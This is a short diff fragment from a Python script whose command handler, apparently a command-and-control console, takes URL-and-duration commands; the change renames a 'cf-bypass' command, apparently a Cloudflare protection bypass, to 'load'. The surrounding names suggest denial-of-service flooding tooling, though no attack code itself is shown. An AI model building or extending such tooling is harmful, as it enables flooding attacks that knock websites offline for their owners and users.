@@ -266,7 +266,7 @@ def main():
                 print('Usage: https <url> <time>')
                 print('Example: https http://example.com 60')
 
-        elif "cf-bypass" in cnc:
+        elif "load" in cnc:
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
